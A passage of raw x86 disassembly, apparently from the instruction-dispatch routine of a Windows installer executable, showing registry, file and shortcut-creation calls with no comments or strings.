  401df4:	53                   	push   %ebx
  401df5:	e8 4a 0c 00 00       	call   0x402a44
  401dfa:	6a 31                	push   $0x31
  401dfc:	8b f0                	mov    %eax,%esi
  401dfe:	e8 41 0c 00 00       	call   0x402a44
  401e03:	6a 22                	push   $0x22
  401e05:	8b d8                	mov    %eax,%ebx
  401e07:	e8 38 0c 00 00       	call   0x402a44
  401e0c:	6a 15                	push   $0x15
  401e0e:	8b f8                	mov    %eax,%edi
  401e10:	e8 2f 0c 00 00       	call   0x402a44
  401e15:	6a ec                	push   $0xffffffec
  401e17:	e8 11 f6 ff ff       	call   0x40142d
  401e1c:	8a 07                	mov    (%edi),%al
  401e1e:	ff 75 e4             	push   -0x1c(%ebp)
  401e21:	f6 d8                	neg    %al
  401e23:	1b c0                	sbb    %eax,%eax
  401e25:	68 00 98 42 00       	push   $0x429800
  401e2a:	23 c7                	and    %edi,%eax
  401e2c:	50                   	push   %eax
  401e2d:	8a 06                	mov    (%esi),%al
  401e2f:	f6 d8                	neg    %al
  401e31:	1b c0                	sbb    %eax,%eax
  401e33:	53                   	push   %ebx
  401e34:	23 c6                	and    %esi,%eax
  401e36:	50                   	push   %eax
  401e37:	ff 75 f8             	push   -0x8(%ebp)
  401e3a:	ff 15 78 71 40 00    	call   *0x407178
  401e40:	83 f8 21             	cmp    $0x21,%eax
  401e43:	0f 8d 90 0a 00 00    	jge    0x4028d9
  401e49:	e9 62 08 00 00       	jmp    0x4026b0
  401e4e:	53                   	push   %ebx
  401e4f:	e8 f0 0b 00 00       	call   0x402a44
  401e54:	8b f0                	mov    %eax,%esi
  401e56:	56                   	push   %esi
  401e57:	6a eb                	push   $0xffffffeb
  401e59:	e8 28 32 00 00       	call   0x405086
  401e5e:	56                   	push   %esi
  401e5f:	e8 9a 37 00 00       	call   0x4055fe
  401e64:	3b c3                	cmp    %ebx,%eax
  401e66:	89 45 08             	mov    %eax,0x8(%ebp)
  401e69:	0f 84 41 08 00 00    	je     0x4026b0
  401e6f:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401e72:	74 46                	je     0x401eba
  401e74:	8b 35 5c 71 40 00    	mov    0x40715c,%esi
  401e7a:	eb 07                	jmp    0x401e83
  401e7c:	6a 0f                	push   $0xf
  401e7e:	e8 bf 43 00 00       	call   0x406242
  401e83:	6a 64                	push   $0x64
  401e85:	ff 75 08             	push   0x8(%ebp)
  401e88:	ff d6                	call   *%esi
  401e8a:	3d 02 01 00 00       	cmp    $0x102,%eax
  401e8f:	74 eb                	je     0x401e7c
  401e91:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401e94:	50                   	push   %eax
  401e95:	ff 75 08             	push   0x8(%ebp)
  401e98:	ff 15 58 71 40 00    	call   *0x407158
  401e9e:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401ea1:	7c 0b                	jl     0x401eae
  401ea3:	ff 75 f4             	push   -0xc(%ebp)
  401ea6:	57                   	push   %edi
  401ea7:	e8 1f 3f 00 00       	call   0x405dcb
  401eac:	eb 0c                	jmp    0x401eba
  401eae:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  401eb1:	74 07                	je     0x401eba
  401eb3:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401eba:	ff 75 08             	push   0x8(%ebp)
  401ebd:	ff 15 f4 70 40 00    	call   *0x4070f4
  401ec3:	e9 11 0a 00 00       	jmp    0x4028d9
  401ec8:	6a 02                	push   $0x2
  401eca:	e8 75 0b 00 00       	call   0x402a44
  401ecf:	50                   	push   %eax
  401ed0:	e8 9c 42 00 00       	call   0x406171
  401ed5:	3b c3                	cmp    %ebx,%eax
  401ed7:	89 45 08             	mov    %eax,0x8(%ebp)
  401eda:	74 13                	je     0x401eef
  401edc:	8b d8                	mov    %eax,%ebx
  401ede:	ff 73 14             	push   0x14(%ebx)
  401ee1:	57                   	push   %edi
  401ee2:	e8 e4 3e 00 00       	call   0x405dcb
  401ee7:	ff 73 18             	push   0x18(%ebx)
  401eea:	e9 7c f6 ff ff       	jmp    0x40156b
  401eef:	88 1e                	mov    %bl,(%esi)
  401ef1:	88 1f                	mov    %bl,(%edi)
  401ef3:	e9 b8 07 00 00       	jmp    0x4026b0
  401ef8:	6a ee                	push   $0xffffffee
  401efa:	e8 45 0b 00 00       	call   0x402a44
  401eff:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  401f02:	89 45 d0             	mov    %eax,-0x30(%ebp)
  401f05:	51                   	push   %ecx
  401f06:	50                   	push   %eax
  401f07:	6a 08                	push   $0x8
  401f09:	e8 f8 42 00 00       	call   0x406206
  401f0e:	ff d0                	call   *%eax
  401f10:	88 1e                	mov    %bl,(%esi)
  401f12:	3b c3                	cmp    %ebx,%eax
  401f14:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401f17:	88 1f                	mov    %bl,(%edi)
  401f19:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401f20:	0f 84 b3 09 00 00    	je     0x4028d9
  401f26:	50                   	push   %eax
  401f27:	6a 40                	push   $0x40
  401f29:	ff 15 60 71 40 00    	call   *0x407160
  401f2f:	3b c3                	cmp    %ebx,%eax
  401f31:	89 45 08             	mov    %eax,0x8(%ebp)
  401f34:	0f 84 9f 09 00 00    	je     0x4028d9
  401f3a:	6a 09                	push   $0x9
  401f3c:	e8 c5 42 00 00       	call   0x406206
  401f41:	6a 0a                	push   $0xa
  401f43:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401f46:	e8 bb 42 00 00       	call   0x406206
  401f4b:	ff 75 08             	push   0x8(%ebp)
  401f4e:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  401f51:	ff 75 f4             	push   -0xc(%ebp)
  401f54:	53                   	push   %ebx
  401f55:	ff 75 d0             	push   -0x30(%ebp)
  401f58:	ff 55 c0             	call   *-0x40(%ebp)
  401f5b:	85 c0                	test   %eax,%eax
  401f5d:	74 32                	je     0x401f91
  401f5f:	8d 45 c8             	lea    -0x38(%ebp),%eax
  401f62:	50                   	push   %eax
  401f63:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401f66:	50                   	push   %eax
  401f67:	68 14 90 40 00       	push   $0x409014
  401f6c:	ff 75 08             	push   0x8(%ebp)
  401f6f:	ff 55 c4             	call   *-0x3c(%ebp)
  401f72:	85 c0                	test   %eax,%eax
  401f74:	74 1b                	je     0x401f91
  401f76:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401f79:	ff 70 08             	push   0x8(%eax)
  401f7c:	56                   	push   %esi
  401f7d:	e8 49 3e 00 00       	call   0x405dcb
  401f82:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401f85:	ff 70 0c             	push   0xc(%eax)
  401f88:	57                   	push   %edi
  401f89:	e8 3d 3e 00 00       	call   0x405dcb
  401f8e:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401f91:	ff 75 08             	push   0x8(%ebp)
  401f94:	e9 03 fc ff ff       	jmp    0x401b9c
  401f99:	39 1d d8 37 42 00    	cmp    %ebx,0x4237d8
  401f9f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401fa6:	0f 8c b5 00 00 00    	jl     0x402061
  401fac:	6a f0                	push   $0xfffffff0
  401fae:	e8 91 0a 00 00       	call   0x402a44
  401fb3:	6a 01                	push   $0x1
  401fb5:	8b f0                	mov    %eax,%esi
  401fb7:	e8 88 0a 00 00       	call   0x402a44
  401fbc:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  401fbf:	89 45 08             	mov    %eax,0x8(%ebp)
  401fc2:	74 0d                	je     0x401fd1
  401fc4:	56                   	push   %esi
  401fc5:	ff 15 54 71 40 00    	call   *0x407154
  401fcb:	8b f8                	mov    %eax,%edi
  401fcd:	3b fb                	cmp    %ebx,%edi
  401fcf:	75 10                	jne    0x401fe1
  401fd1:	6a 08                	push   $0x8
  401fd3:	53                   	push   %ebx
  401fd4:	56                   	push   %esi
  401fd5:	ff 15 50 71 40 00    	call   *0x407150
  401fdb:	8b f8                	mov    %eax,%edi
  401fdd:	3b fb                	cmp    %ebx,%edi
  401fdf:	74 79                	je     0x40205a
  401fe1:	ff 75 08             	push   0x8(%ebp)
  401fe4:	57                   	push   %edi
  401fe5:	e8 8b 42 00 00       	call   0x406275
  401fea:	8b f0                	mov    %eax,%esi
  401fec:	3b f3                	cmp    %ebx,%esi
  401fee:	74 3d                	je     0x40202d
  401ff0:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401ff3:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401ff6:	74 17                	je     0x40200f
  401ff8:	ff 75 e0             	push   -0x20(%ebp)
  401ffb:	e8 2d f4 ff ff       	call   0x40142d
  402000:	ff d6                	call   *%esi
  402002:	85 c0                	test   %eax,%eax
  402004:	74 31                	je     0x402037
  402006:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40200d:	eb 28                	jmp    0x402037
  40200f:	68 00 90 40 00       	push   $0x409000
  402014:	68 04 a8 40 00       	push   $0x40a804
  402019:	68 00 40 42 00       	push   $0x424000
  40201e:	68 00 04 00 00       	push   $0x400
  402023:	ff 75 f8             	push   -0x8(%ebp)
  402026:	ff d6                	call   *%esi
  402028:	83 c4 14             	add    $0x14,%esp
  40202b:	eb 0a                	jmp    0x402037
  40202d:	ff 75 08             	push   0x8(%ebp)
  402030:	6a f7                	push   $0xfffffff7
  402032:	e8 4f 30 00 00       	call   0x405086
  402037:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  40203a:	0f 85 99 08 00 00    	jne    0x4028d9
  402040:	57                   	push   %edi
  402041:	e8 47 17 00 00       	call   0x40378d
  402046:	85 c0                	test   %eax,%eax
  402048:	0f 84 8b 08 00 00    	je     0x4028d9
  40204e:	57                   	push   %edi
  40204f:	ff 15 44 71 40 00    	call   *0x407144
  402055:	e9 7f 08 00 00       	jmp    0x4028d9
  40205a:	6a f6                	push   $0xfffffff6
  40205c:	e9 6d 01 00 00       	jmp    0x4021ce
  402061:	6a e7                	push   $0xffffffe7
  402063:	e9 66 01 00 00       	jmp    0x4021ce
  402068:	6a f0                	push   $0xfffffff0
  40206a:	e8 d5 09 00 00       	call   0x402a44
  40206f:	6a df                	push   $0xffffffdf
  402071:	89 45 cc             	mov    %eax,-0x34(%ebp)
  402074:	e8 cb 09 00 00       	call   0x402a44
  402079:	6a 02                	push   $0x2
  40207b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40207e:	e8 c1 09 00 00       	call   0x402a44
  402083:	6a cd                	push   $0xffffffcd
  402085:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  402088:	e8 b7 09 00 00       	call   0x402a44
  40208d:	6a 45                	push   $0x45
  40208f:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402092:	e8 ad 09 00 00       	call   0x402a44
  402097:	ff 75 f4             	push   -0xc(%ebp)
  40209a:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40209d:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4020a0:	8b c8                	mov    %eax,%ecx
  4020a2:	8b f8                	mov    %eax,%edi
  4020a4:	8b f0                	mov    %eax,%esi
  4020a6:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  4020ac:	c1 f8 10             	sar    $0x10,%eax
  4020af:	c1 fe 0c             	sar    $0xc,%esi
  4020b2:	25 ff ff 00 00       	and    $0xffff,%eax
  4020b7:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  4020ba:	81 e7 00 80 00 00    	and    $0x8000,%edi
  4020c0:	83 e6 07             	and    $0x7,%esi
  4020c3:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4020c6:	e8 81 38 00 00       	call   0x40594c
  4020cb:	85 c0                	test   %eax,%eax
  4020cd:	75 07                	jne    0x4020d6
  4020cf:	6a 21                	push   $0x21
  4020d1:	e8 6e 09 00 00       	call   0x402a44
  4020d6:	8d 45 08             	lea    0x8(%ebp),%eax
  4020d9:	50                   	push   %eax
  4020da:	68 f8 73 40 00       	push   $0x4073f8
  4020df:	6a 01                	push   $0x1
  4020e1:	53                   	push   %ebx
  4020e2:	68 08 74 40 00       	push   $0x407408
  4020e7:	ff 15 90 72 40 00    	call   *0x407290
  4020ed:	3b c3                	cmp    %ebx,%eax
  4020ef:	0f 8c d0 00 00 00    	jl     0x4021c5
  4020f5:	8b 45 08             	mov    0x8(%ebp),%eax
  4020f8:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4020fb:	52                   	push   %edx
  4020fc:	68 18 74 40 00       	push   $0x407418
  402101:	8b 08                	mov    (%eax),%ecx
  402103:	50                   	push   %eax
  402104:	ff 11                	call   *(%ecx)
  402106:	3b c3                	cmp    %ebx,%eax
  402108:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40210b:	0f 8c a6 00 00 00    	jl     0x4021b7
  402111:	8b 45 08             	mov    0x8(%ebp),%eax
  402114:	ff 75 f4             	push   -0xc(%ebp)
  402117:	8b 08                	mov    (%eax),%ecx
  402119:	50                   	push   %eax
  40211a:	ff 51 50             	call   *0x50(%ecx)
  40211d:	3b fb                	cmp    %ebx,%edi
  40211f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402122:	75 0e                	jne    0x402132
  402124:	8b 45 08             	mov    0x8(%ebp),%eax
  402127:	68 00 98 42 00       	push   $0x429800
  40212c:	50                   	push   %eax
  40212d:	8b 08                	mov    (%eax),%ecx
  40212f:	ff 51 24             	call   *0x24(%ecx)
  402132:	3b f3                	cmp    %ebx,%esi
  402134:	74 0a                	je     0x402140
  402136:	8b 45 08             	mov    0x8(%ebp),%eax
  402139:	56                   	push   %esi
  40213a:	50                   	push   %eax
  40213b:	8b 08                	mov    (%eax),%ecx
  40213d:	ff 51 3c             	call   *0x3c(%ecx)
  402140:	8b 45 08             	mov    0x8(%ebp),%eax
  402143:	ff 75 c4             	push   -0x3c(%ebp)
  402146:	8b 08                	mov    (%eax),%ecx
  402148:	50                   	push   %eax
  402149:	ff 51 34             	call   *0x34(%ecx)
  40214c:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  40214f:	38 19                	cmp    %bl,(%ecx)
  402151:	74 0d                	je     0x402160
  402153:	8b 45 08             	mov    0x8(%ebp),%eax
  402156:	ff 75 bc             	push   -0x44(%ebp)
  402159:	8b 10                	mov    (%eax),%edx
  40215b:	51                   	push   %ecx
  40215c:	50                   	push   %eax
  40215d:	ff 52 44             	call   *0x44(%edx)
  402160:	8b 45 08             	mov    0x8(%ebp),%eax
  402163:	ff 75 b4             	push   -0x4c(%ebp)
  402166:	8b 08                	mov    (%eax),%ecx
  402168:	50                   	push   %eax
  402169:	ff 51 2c             	call   *0x2c(%ecx)
  40216c:	8b 45 08             	mov    0x8(%ebp),%eax
  40216f:	ff 75 c8             	push   -0x38(%ebp)
  402172:	8b 08                	mov    (%eax),%ecx
  402174:	50                   	push   %eax
  402175:	ff 51 1c             	call   *0x1c(%ecx)
  402178:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40217b:	7c 31                	jl     0x4021ae
  40217d:	68 00 04 00 00       	push   $0x400
  402182:	c7 45 f8 05 40 00 80 	movl   $0x80004005,-0x8(%ebp)
  402189:	ff 75 f4             	push   -0xc(%ebp)
  40218c:	6a ff                	push   $0xffffffff
  40218e:	ff 75 cc             	push   -0x34(%ebp)
  402191:	53                   	push   %ebx
  402192:	53                   	push   %ebx
  402193:	ff 15 40 71 40 00    	call   *0x407140
  402199:	85 c0                	test   %eax,%eax
  40219b:	74 11                	je     0x4021ae
  40219d:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4021a0:	6a 01                	push   $0x1
  4021a2:	ff 75 f4             	push   -0xc(%ebp)
  4021a5:	8b 08                	mov    (%eax),%ecx
  4021a7:	50                   	push   %eax
  4021a8:	ff 51 18             	call   *0x18(%ecx)
  4021ab:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4021ae:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4021b1:	50                   	push   %eax
  4021b2:	8b 08                	mov    (%eax),%ecx
  4021b4:	ff 51 08             	call   *0x8(%ecx)
  4021b7:	8b 45 08             	mov    0x8(%ebp),%eax
  4021ba:	50                   	push   %eax
  4021bb:	8b 08                	mov    (%eax),%ecx
  4021bd:	ff 51 08             	call   *0x8(%ecx)
  4021c0:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4021c3:	7d 13                	jge    0x4021d8
  4021c5:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4021cc:	6a f0                	push   $0xfffffff0
  4021ce:	e8 5a f2 ff ff       	call   0x40142d
  4021d3:	e9 01 07 00 00       	jmp    0x4028d9
  4021d8:	6a f4                	push   $0xfffffff4
  4021da:	eb f2                	jmp    0x4021ce
  4021dc:	53                   	push   %ebx
  4021dd:	e8 62 08 00 00       	call   0x402a44
  4021e2:	6a 11                	push   $0x11
  4021e4:	8b f0                	mov    %eax,%esi
  4021e6:	e8 59 08 00 00       	call   0x402a44
  4021eb:	6a 23                	push   $0x23
  4021ed:	8b f8                	mov    %eax,%edi
  4021ef:	e8 50 08 00 00       	call   0x402a44
  4021f4:	56                   	push   %esi
  4021f5:	89 45 08             	mov    %eax,0x8(%ebp)
  4021f8:	e8 74 3f 00 00       	call   0x406171
  4021fd:	85 c0                	test   %eax,%eax
  4021ff:	75 0d                	jne    0x40220e
  402201:	53                   	push   %ebx
  402202:	6a f9                	push   $0xfffffff9
  402204:	e8 7d 2e 00 00       	call   0x405086
  402209:	e9 a2 04 00 00       	jmp    0x4026b0
  40220e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402211:	56                   	push   %esi
  402212:	89 45 9c             	mov    %eax,-0x64(%ebp)
  402215:	c7 45 a0 02 00 00 00 	movl   $0x2,-0x60(%ebp)
  40221c:	e8 62 3c 00 00       	call   0x405e83
  402221:	57                   	push   %edi
  402222:	88 5c 30 01          	mov    %bl,0x1(%eax,%esi,1)
  402226:	e8 58 3c 00 00       	call   0x405e83
  40222b:	88 5c 38 01          	mov    %bl,0x1(%eax,%edi,1)
  40222f:	8b 45 08             	mov    0x8(%ebp),%eax
  402232:	66 8b 4d e0          	mov    -0x20(%ebp),%cx
  402236:	50                   	push   %eax
  402237:	53                   	push   %ebx
  402238:	89 75 a4             	mov    %esi,-0x5c(%ebp)
  40223b:	89 7d a8             	mov    %edi,-0x58(%ebp)
  40223e:	89 45 b6             	mov    %eax,-0x4a(%ebp)
  402241:	66 89 4d ac          	mov    %cx,-0x54(%ebp)
  402245:	e8 3c 2e 00 00       	call   0x405086
  40224a:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40224d:	50                   	push   %eax
  40224e:	ff 15 7c 71 40 00    	call   *0x40717c
  402254:	85 c0                	test   %eax,%eax
  402256:	0f 84 7d 06 00 00    	je     0x4028d9
  40225c:	eb a3                	jmp    0x402201
  40225e:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  402263:	74 1d                	je     0x402282
  402265:	68 10 00 20 00       	push   $0x200010
  40226a:	6a e8                	push   $0xffffffe8
  40226c:	53                   	push   %ebx
  40226d:	e8 1d 3c 00 00       	call   0x405e8f
  402272:	50                   	push   %eax
  402273:	e8 eb 33 00 00       	call   0x405663
  402278:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  40227d:	e9 62 06 00 00       	jmp    0x4028e4
  402282:	ff 05 b4 37 42 00    	incl   0x4237b4
  402288:	e9 4c 06 00 00       	jmp    0x4028d9
  40228d:	33 f6                	xor    %esi,%esi
  40228f:	33 ff                	xor    %edi,%edi
  402291:	3b c3                	cmp    %ebx,%eax
  402293:	74 0b                	je     0x4022a0
  402295:	53                   	push   %ebx
  402296:	e8 a9 07 00 00       	call   0x402a44
  40229b:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40229e:	8b f0                	mov    %eax,%esi
  4022a0:	3b d3                	cmp    %ebx,%edx
  4022a2:	74 09                	je     0x4022ad
  4022a4:	6a 11                	push   $0x11
  4022a6:	e8 99 07 00 00       	call   0x402a44
  4022ab:	8b f8                	mov    %eax,%edi
  4022ad:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4022b0:	74 09                	je     0x4022bb
  4022b2:	6a 22                	push   $0x22
  4022b4:	e8 8b 07 00 00       	call   0x402a44
  4022b9:	8b d8                	mov    %eax,%ebx
  4022bb:	6a cd                	push   $0xffffffcd
  4022bd:	e8 82 07 00 00       	call   0x402a44
  4022c2:	50                   	push   %eax
  4022c3:	53                   	push   %ebx
  4022c4:	57                   	push   %edi
  4022c5:	56                   	push   %esi
  4022c6:	ff 15 4c 71 40 00    	call   *0x40714c
  4022cc:	e9 df f2 ff ff       	jmp    0x4015b0
  4022d1:	66 a1 10 90 40 00    	mov    0x409010,%ax
  4022d7:	6a 01                	push   $0x1
  4022d9:	66 89 45 0a          	mov    %ax,0xa(%ebp)
  4022dd:	e8 62 07 00 00       	call   0x402a44
  4022e2:	6a 12                	push   $0x12
  4022e4:	8b f8                	mov    %eax,%edi
  4022e6:	e8 59 07 00 00       	call   0x402a44
  4022eb:	6a dd                	push   $0xffffffdd
  4022ed:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4022f0:	e8 4f 07 00 00       	call   0x402a44
  4022f5:	50                   	push   %eax
  4022f6:	68 ff 03 00 00       	push   $0x3ff
  4022fb:	8d 45 0a             	lea    0xa(%ebp),%eax
  4022fe:	56                   	push   %esi
  4022ff:	50                   	push   %eax
  402300:	ff 75 cc             	push   -0x34(%ebp)
  402303:	57                   	push   %edi
  402304:	ff 15 38 71 40 00    	call   *0x407138
  40230a:	80 3e 0a             	cmpb   $0xa,(%esi)
  40230d:	e9 2b f4 ff ff       	jmp    0x40173d
  402312:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402315:	75 2b                	jne    0x402342
  402317:	6a 02                	push   $0x2
  402319:	e8 30 08 00 00       	call   0x402b4e
  40231e:	8b f0                	mov    %eax,%esi
  402320:	3b f3                	cmp    %ebx,%esi
  402322:	0f 84 88 03 00 00    	je     0x4026b0
  402328:	6a 33                	push   $0x33
  40232a:	e8 15 07 00 00       	call   0x402a44
  40232f:	50                   	push   %eax
  402330:	56                   	push   %esi
  402331:	ff 15 1c 70 40 00    	call   *0x40701c
  402337:	56                   	push   %esi
  402338:	8b f8                	mov    %eax,%edi
  40233a:	ff 15 20 70 40 00    	call   *0x407020
  402340:	eb 1f                	jmp    0x402361
  402342:	6a 22                	push   $0x22
  402344:	e8 fb 06 00 00       	call   0x402a44
  402349:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40234c:	83 e1 02             	and    $0x2,%ecx
  40234f:	51                   	push   %ecx
  402350:	50                   	push   %eax
  402351:	ff 75 dc             	push   -0x24(%ebp)
  402354:	e8 e0 07 00 00       	call   0x402b39
  402359:	50                   	push   %eax
  40235a:	e8 25 07 00 00       	call   0x402a84
  40235f:	8b f8                	mov    %eax,%edi
  402361:	3b fb                	cmp    %ebx,%edi
  402363:	0f 84 70 05 00 00    	je     0x4028d9
  402369:	e9 42 03 00 00       	jmp    0x4026b0
  40236e:	50                   	push   %eax
  40236f:	e8 c5 07 00 00       	call   0x402b39
  402374:	8b 75 e8             	mov    -0x18(%ebp),%esi
  402377:	8b f8                	mov    %eax,%edi
  402379:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40237c:	6a 02                	push   $0x2
  40237e:	89 45 cc             	mov    %eax,-0x34(%ebp)
  402381:	e8 be 06 00 00       	call   0x402a44
  402386:	6a 11                	push   $0x11
  402388:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40238b:	e8 b4 06 00 00       	call   0x402a44
  402390:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402393:	53                   	push   %ebx
  402394:	51                   	push   %ecx
  402395:	8b 0d d0 37 42 00    	mov    0x4237d0,%ecx
  40239b:	83 c9 02             	or     $0x2,%ecx
  40239e:	53                   	push   %ebx
  40239f:	51                   	push   %ecx
  4023a0:	53                   	push   %ebx
  4023a1:	53                   	push   %ebx
  4023a2:	53                   	push   %ebx
  4023a3:	50                   	push   %eax
  4023a4:	57                   	push   %edi
  4023a5:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4023ac:	ff 15 24 70 40 00    	call   *0x407024
  4023b2:	85 c0                	test   %eax,%eax
  4023b4:	0f 85 1f 05 00 00    	jne    0x4028d9
  4023ba:	83 fe 01             	cmp    $0x1,%esi
  4023bd:	bf 00 9c 40 00       	mov    $0x409c00,%edi
  4023c2:	75 0e                	jne    0x4023d2
  4023c4:	6a 23                	push   $0x23
  4023c6:	e8 79 06 00 00       	call   0x402a44
  4023cb:	57                   	push   %edi
  4023cc:	e8 b2 3a 00 00       	call   0x405e83
  4023d1:	40                   	inc    %eax
  4023d2:	83 fe 04             	cmp    $0x4,%esi
  4023d5:	75 0e                	jne    0x4023e5
  4023d7:	6a 03                	push   $0x3
  4023d9:	e8 49 06 00 00       	call   0x402a27
  4023de:	56                   	push   %esi
  4023df:	a3 00 9c 40 00       	mov    %eax,0x409c00
  4023e4:	58                   	pop    %eax
  4023e5:	83 fe 03             	cmp    $0x3,%esi
  4023e8:	75 0f                	jne    0x4023f9
  4023ea:	68 00 0c 00 00       	push   $0xc00
  4023ef:	57                   	push   %edi
  4023f0:	53                   	push   %ebx
  4023f1:	ff 75 e4             	push   -0x1c(%ebp)
  4023f4:	e8 6d 0b 00 00       	call   0x402f66
  4023f9:	50                   	push   %eax
  4023fa:	57                   	push   %edi
  4023fb:	ff 75 cc             	push   -0x34(%ebp)
  4023fe:	53                   	push   %ebx
  4023ff:	ff 75 c8             	push   -0x38(%ebp)
  402402:	ff 75 08             	push   0x8(%ebp)
  402405:	ff 15 28 70 40 00    	call   *0x407028
  40240b:	85 c0                	test   %eax,%eax
  40240d:	75 03                	jne    0x402412
  40240f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402412:	ff 75 08             	push   0x8(%ebp)
  402415:	e9 c8 00 00 00       	jmp    0x4024e2
  40241a:	68 19 00 02 00       	push   $0x20019
  40241f:	e8 2a 07 00 00       	call   0x402b4e
  402424:	6a 33                	push   $0x33
  402426:	8b f8                	mov    %eax,%edi
  402428:	e8 17 06 00 00       	call   0x402a44
  40242d:	3b fb                	cmp    %ebx,%edi
  40242f:	88 1e                	mov    %bl,(%esi)
  402431:	0f 84 79 02 00 00    	je     0x4026b0
  402437:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40243a:	c7 45 cc 00 04 00 00 	movl   $0x400,-0x34(%ebp)
  402441:	51                   	push   %ecx
  402442:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402445:	56                   	push   %esi
  402446:	51                   	push   %ecx
  402447:	53                   	push   %ebx
  402448:	50                   	push   %eax
  402449:	57                   	push   %edi
  40244a:	ff 15 2c 70 40 00    	call   *0x40702c
  402450:	33 c9                	xor    %ecx,%ecx
  402452:	41                   	inc    %ecx
  402453:	85 c0                	test   %eax,%eax
  402455:	75 2e                	jne    0x402485
  402457:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  40245b:	74 13                	je     0x402470
  40245d:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  402460:	74 06                	je     0x402468
  402462:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402466:	75 1d                	jne    0x402485
  402468:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40246b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40246e:	eb 6b                	jmp    0x4024db
  402470:	ff 36                	push   (%esi)
  402472:	33 c0                	xor    %eax,%eax
  402474:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402477:	56                   	push   %esi
  402478:	0f 94 c0             	sete   %al
  40247b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40247e:	e8 48 39 00 00       	call   0x405dcb
  402483:	eb 5c                	jmp    0x4024e1
  402485:	88 1e                	mov    %bl,(%esi)
  402487:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40248a:	eb 55                	jmp    0x4024e1
  40248c:	68 19 00 02 00       	push   $0x20019
  402491:	e8 b8 06 00 00       	call   0x402b4e
  402496:	6a 03                	push   $0x3
  402498:	8b f8                	mov    %eax,%edi
  40249a:	e8 88 05 00 00       	call   0x402a27
  40249f:	3b fb                	cmp    %ebx,%edi
  4024a1:	88 1e                	mov    %bl,(%esi)
  4024a3:	0f 84 07 02 00 00    	je     0x4026b0
  4024a9:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4024ac:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4024b1:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4024b4:	74 0c                	je     0x4024c2
  4024b6:	51                   	push   %ecx
  4024b7:	56                   	push   %esi
  4024b8:	50                   	push   %eax
  4024b9:	57                   	push   %edi
  4024ba:	ff 15 30 70 40 00    	call   *0x407030
  4024c0:	eb 19                	jmp    0x4024db
  4024c2:	53                   	push   %ebx
  4024c3:	53                   	push   %ebx
  4024c4:	53                   	push   %ebx
  4024c5:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4024c8:	53                   	push   %ebx
  4024c9:	51                   	push   %ecx
  4024ca:	56                   	push   %esi
  4024cb:	50                   	push   %eax
  4024cc:	57                   	push   %edi
  4024cd:	ff 15 18 70 40 00    	call   *0x407018
  4024d3:	85 c0                	test   %eax,%eax
  4024d5:	0f 85 d5 01 00 00    	jne    0x4026b0
  4024db:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  4024e1:	57                   	push   %edi
  4024e2:	ff 15 20 70 40 00    	call   *0x407020
  4024e8:	e9 ec 03 00 00       	jmp    0x4028d9
  4024ed:	56                   	push   %esi
